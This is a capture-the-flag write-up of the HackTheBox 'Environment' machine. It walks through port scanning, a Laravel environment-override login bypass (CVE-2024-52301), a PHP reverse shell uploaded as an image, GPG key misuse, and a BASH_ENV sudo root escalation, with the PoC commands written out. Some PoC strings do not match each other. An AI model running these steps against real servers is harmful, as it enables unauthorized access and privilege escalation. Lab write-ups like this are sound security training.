* * *

### LAB: Environment
### CTF: HACKTHEBOX

* * *
![image](https://github.com/user-attachments/assets/f85c958b-48e2-4440-ad40-6b2915533b6b)


- Rustscan's output-:

```bash
❯ rustscan -a environment.htb -- -Pn -sC -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/sensei/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.11.67:22
Open 10.10.11.67:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-13 15:49 WAT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:49
Completed NSE at 15:49, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:49
Completed NSE at 15:49, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:49
Completed NSE at 15:49, 0.00s elapsed
Initiating Connect Scan at 15:49
Scanning environment.htb (10.10.11.67) [2 ports]
Discovered open port 22/tcp on 10.10.11.67
Discovered open port 80/tcp on 10.10.11.67
Completed Connect Scan at 15:49, 2.25s elapsed (2 total ports)
Initiating Service scan at 15:49
Scanning 2 services on environment.htb (10.10.11.67)
Completed Service scan at 15:49, 6.64s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.67.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:49
Completed NSE at 15:49, 17.51s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:49
Completed NSE at 15:49, 2.92s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:49
Completed NSE at 15:49, 0.00s elapsed
Nmap scan report for environment.htb (10.10.11.67)
Host is up, received user-set (0.25s latency).
Scanned at 2025-05-13 15:49:15 WAT for 30s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 5c:02:33:95:ef:44:e2:80:cd:3a:96:02:23:f1:92:64 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGrihP7aP61ww7KrHUutuC/GKOyHifRmeM070LMF7b6vguneFJ3dokS/UwZxcp+H82U2LL+patf3wEpLZz1oZdQ=
|   256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ7xeTjQWBwI6WERkd6C7qIKOCnXxGGtesEDTnFtL2f2
80/tcp open  http    syn-ack nginx 1.22.1
|_http-title: Save the Environment | environment.htb
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
|_http-server-header: nginx/1.22.1
| http-methods: 
|_  Supported Methods: GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- Ffuf's output

![image](https://github.com/user-attachments/assets/8ca19e57-5173-4697-9df8-d10293e28e5c)


- I identified Laravel's version because debug mode is enabled.I made a `GET` request to the directory upload and encountered an error which exposed the php and laravel build

![image](https://github.com/user-attachments/assets/be5c2345-a912-4073-9df4-2b90c4049ad4)

- I googled for CVES related to this version and got [one](https://github.com/Nyamort/CVE-2024-52301).Laravel is vulnerable to argument injection which occurs if the `register_argc_argv` option is enabled in the php.ini.This setting loads command-line arguments and query params into `$_SERVER['argv']`.The vulnerability allows us to set the environment that the laravel web app will load which signifies that we can load old environments that can be vulnerable.

POC-:

```<url>/?env--=production
```

- Our next task is to find pre-existing enviroment before `production`.I tried to trigger more errors to discover more parts of the source code.I tried to login with no values in the params and I got another error with more exposed source code.

![image](https://github.com/user-attachments/assets/d50b1984-ea85-4fa2-97a1-171349953598)

- The code exposed reveals a pre-existing environment that allows us to login automatically.

```php
      $keep_loggedin = False;
    } elseif ($remember == 'True') {
        $keep_loggedin = True;
    }
 
    if($keep_loggedin !== False) {
    // TODO: Keep user logged in if he selects "Remember Me?"
    }
 
    if(App::environment() == "preprod") { //QOL: login directly as me in dev/local/preprod envs
        $request->session()->regenerate();
        $request->session()->put('user_id', 1);
        return redirect('/management/dashboard');
    }
 
    $user = User::where('email', $email)->first();
```

- Poc-:

```
<url>/login?--env=prepod
```

- Request should be submitted with empty params aside `_token` and remember should be set to false.

![image](https://github.com/user-attachments/assets/db2f93c5-7602-49c6-b3b7-8fc5d440c8f5)

- Portal accessed-:

![image](https://github.com/user-attachments/assets/c5c9f813-43ff-4b4e-ac4a-b068040ae769)


- We can upload a profile picture,let's try to upload a php reverse shell within a legitimate image and an extension `.php.`.

![image](https://github.com/user-attachments/assets/22c6cb5b-67b5-4d80-91ab-aa2229952dd6)


- Shell

![image](https://github.com/user-attachments/assets/189d1a4c-540f-4e14-abe3-defab693940d)

- Reverse shell-:

![image](https://github.com/user-attachments/assets/5a5c1c75-a170-4d2c-bb8f-c0361168b6c3)

- I ran linpeas and discovered a directory where gpg keys are stored.

![image](https://github.com/user-attachments/assets/faff85ff-d6f5-4267-9b5b-beb86f5d566c)

- A gpg encrypted file too-:

![image](https://github.com/user-attachments/assets/8c968551-4a92-4ec4-bee1-a728a2b931dd)

- I decrypted with this-:

![image](https://github.com/user-attachments/assets/3b8f2914-9742-49af-87f4-4272ae11b46a)

- Hish accessed-:

![image](https://github.com/user-attachments/assets/72af2350-ec5e-4e64-b210-6938325ac4b9)

------------------

### Privesc with keep_env and bash_env

------------------

- `sudo -l`-:

![image](https://github.com/user-attachments/assets/1dccd336-c751-4fc9-9c8a-8d93feec781a)

- When running a binary based on the sudoers file, only the default env variables are loaded.`Env_keep` exists to allow us add a vaariable to the members of the `sudo group` which means we can set this variable which can be used when we run as root.The `BASH_ENV` variable indicates the startup script path when a bash non interactive shell is started.
- A non interactive shell starts when you run a bash script.It starts because a bash shebang is indicated.

![image](https://github.com/user-attachments/assets/abe78c69-f335-4b68-a9e4-7e6d9e31cc09)

- I exploited it by creating a bash startup script that starts a bash shell.

![image](https://github.com/user-attachments/assets/59f241bd-c2b5-445e-b7ad-cfeebe362bd2)

- POC-:

```bash
echo -ne "#\! /bin/bash\nbash" > shell.sh
export BASH_ENV=./shell.sh
sudo /usr/bin/systeminfo
```

- Root-:

![image](https://github.com/user-attachments/assets/efa8b55c-3a52-409b-9bdc-f5fa8c06710e)


--------------

### REFERENCES-:

--------------

- [Laravel's argument injection](https://github.com/Nyamort/CVE-2024-52301)
- [Bash_env](https://www.linux.org/threads/where-does-bash_env-get-set.47214/)
- [env_keep](https://superuser.com/questions/742333/undocumented-default-values-for-sudoers-env-keep-variable)

---------------




